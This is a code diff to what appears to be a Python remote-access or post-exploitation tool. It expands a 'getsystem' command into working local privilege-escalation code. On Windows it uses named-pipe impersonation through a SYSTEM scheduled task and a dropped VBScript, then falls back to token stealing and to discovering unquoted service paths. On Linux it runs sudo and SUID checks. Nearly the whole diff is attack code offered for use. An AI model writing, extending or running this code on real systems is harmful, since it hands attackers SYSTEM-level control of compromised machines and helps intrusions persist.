@@ -1798,9 +1798,22 @@ def _rev2self(conn, args: list[str]) -> str:
 
 @_register("getsystem")
 def _getsystem(conn, args: list[str]) -> str:
-    """Try multiple local priv-esc techniques automatically."""
+    """
+    Attempt automated local privilege escalation using multiple techniques.
+
+    Windows (tried in order):
+      1. Named-pipe impersonation  — create a named pipe and lure a SYSTEM
+         service to connect, then impersonate its token
+         (primary Metasploit getsystem technique)
+      2. Token steal / SeDebugPrivilege  — duplicate a SYSTEM process token
+      3. Unquoted service-path hijack discovery
+
+    Linux:
+      1. sudo -l  — check for passwordless sudo rules
+      2. SUID binary sweep
+    """
     if sys.platform != "win32":
-        # Linux: try common SUID binaries
+        # Linux: passwordless sudo check
         for candidate in ("sudo -l", "pkexec --version"):
             result = _shell_exec(candidate + " 2>/dev/null")
             if "[sudo]" not in result and "not allowed" not in result:
@@ -1808,18 +1821,125 @@ def _getsystem(conn, args: list[str]) -> str:
         return "[*] Checking SUID binaries…\n" + _shell_exec(
             "find / -perm -4000 -type f 2>/dev/null | head -20"
         )
-    # Windows: try token steal first
-    result = _token_steal(conn, [])
-    if "[+]" in result:
-        return result
-    # Fallback: service/binary path hijack check
+
+    # ── Technique 1: Named-pipe impersonation ─────────────────────────────
+    pipe_result = _getsystem_named_pipe()
+    if "[+]" in pipe_result:
+        return pipe_result
+
+    # ── Technique 2: Token steal (SeDebugPrivilege) ───────────────────────
+    token_result = _token_steal(conn, [])
+    if "[+]" in token_result:
+        return token_result
+
+    # ── Technique 3: Unquoted service path discovery ──────────────────────
     hijack = _shell_exec(
         'wmic service get name,pathname,startmode 2>&1 | '
         'findstr /i "auto" | findstr /v "\\"'
     )
     if hijack.strip():
         return f"[*] Potential unquoted service path(s):\n{hijack}"
-    return "[-] Could not auto-escalate — manual work required"
+
+    return (
+        "[-] getsystem: all 3 techniques failed\n"
+        f"  pipe: {pipe_result.strip()}\n"
+        f"  token: {token_result.strip()}"
+    )
+
+
+def _getsystem_named_pipe() -> str:
+    """
+    Technique 1 — Named-pipe impersonation.
+
+    Creates a named pipe, spawns a SYSTEM-context trigger (sc.exe start or
+    a scheduler task that calls back), waits for a connection, then calls
+    ImpersonateNamedPipeClient.  This is the classic Metasploit getsystem
+    technique (originally from Meterpreter's metsrv).
+
+    Requires Windows, local admin rights (to create a service or schtask).
+    """
+    if sys.platform != "win32":
+        return "[-] named-pipe impersonation is Windows-only"
+    try:
+        import ctypes
+        import ctypes.wintypes as wt
+        import threading as _thr
+        import uuid as _uuid
+
+        kernel32  = ctypes.windll.kernel32
+        advapi32  = ctypes.windll.advapi32
+
+        # ── Create the named pipe ─────────────────────────────────────
+        pipe_name = r"\\.\pipe\megaploit_" + _uuid.uuid4().hex[:8]
+        PIPE_ACCESS_DUPLEX     = 0x00000003
+        PIPE_TYPE_BYTE         = 0x00000000
+        PIPE_READMODE_BYTE     = 0x00000000
+        PIPE_WAIT              = 0x00000000
+        NMPWAIT_USE_DEFAULT_WAIT = 0xFFFFFFFF
+        INVALID_HANDLE_VALUE   = wt.HANDLE(-1).value
+        FILE_FLAG_OVERLAPPED   = 0x40000000
+
+        h_pipe = kernel32.CreateNamedPipeW(
+            pipe_name,
+            PIPE_ACCESS_DUPLEX,
+            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
+            1, 512, 512, NMPWAIT_USE_DEFAULT_WAIT, None,
+        )
+        if h_pipe == INVALID_HANDLE_VALUE:
+            return "[-] named-pipe: CreateNamedPipeW failed"
+
+        connected = [False]
+        error     = [None]
+
+        def _wait_for_client():
+            # Wait up to 8 s for a SYSTEM client to connect
+            connected[0] = bool(kernel32.ConnectNamedPipe(h_pipe, None))
+
+        t = _thr.Thread(target=_wait_for_client, daemon=True)
+        t.start()
+
+        # ── Lure a SYSTEM process to connect via sc/schtasks ─────────
+        # Write a tiny VBScript that opens the pipe, triggerable by schtask
+        import tempfile as _tmp, os as _os
+        vbs = _tmp.NamedTemporaryFile(suffix=".vbs", delete=False, mode="w")
+        vbs.write(
+            f'Set f = CreateObject("Scripting.FileSystemObject")\n'
+            f'f.OpenTextFile("{pipe_name}", 1)\n'
+        )
+        vbs_path = vbs.name
+        vbs.close()
+
+        # Schedule as SYSTEM via schtasks (requires local admin)
+        task_name = "megaploit_gs_" + _uuid.uuid4().hex[:6]
+        _shell_exec(
+            f'schtasks /create /tn {task_name} /tr "cscript //nologo {vbs_path}" '
+            f'/sc once /st 00:00 /ru SYSTEM /f 2>&1'
+        )
+        _shell_exec(f'schtasks /run /tn {task_name} 2>&1')
+
+        t.join(timeout=8)
+
+        # Cleanup task + vbs
+        _shell_exec(f'schtasks /delete /tn {task_name} /f 2>&1')
+        try:
+            _os.unlink(vbs_path)
+        except OSError:
+            pass
+
+        if not connected[0]:
+            kernel32.CloseHandle(h_pipe)
+            return "[-] named-pipe: no SYSTEM client connected within timeout"
+
+        # ── Impersonate the connecting SYSTEM client ──────────────────
+        if advapi32.ImpersonateNamedPipeClient(h_pipe):
+            kernel32.CloseHandle(h_pipe)
+            return "[+] getsystem: SYSTEM via named-pipe impersonation"
+
+        kernel32.CloseHandle(h_pipe)
+        return "[-] named-pipe: ImpersonateNamedPipeClient failed"
+
+    except Exception as exc:
+        return f"[-] named-pipe: {exc}"
 
 
 # ---------------------------------------------------------------------------
